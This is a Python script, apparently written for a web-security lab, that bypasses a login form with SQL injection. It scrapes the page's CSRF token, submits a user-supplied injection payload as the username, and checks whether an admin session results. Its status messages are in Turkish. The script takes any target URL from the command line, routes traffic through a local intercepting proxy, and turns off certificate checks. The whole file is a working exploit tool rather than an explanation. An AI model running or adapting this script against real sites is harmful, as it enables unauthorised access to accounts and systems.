import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    csrf_input = soup.find("input", {"name": "csrf"})
    

    if csrf_input:
        csrf = csrf_input.get('value')
        return csrf
    else:
        print("Csrf  not found")
        return None

def exploit_sqli(s, url, payload):
    csrf = get_csrf(s, url)
    
    if csrf is None:
        return False  
    
    data = {
        "csrf": csrf,  
        "username": payload,
        "password": "bos"
    }
    
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] For Example: %s www.random.com "1=1"' % sys.argv[0])
        sys.exit(1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL INJECTION BULUNDU Admin giriş yaptı")
    else:
        print("[-] SQL INJECTION BULUNAMADI")
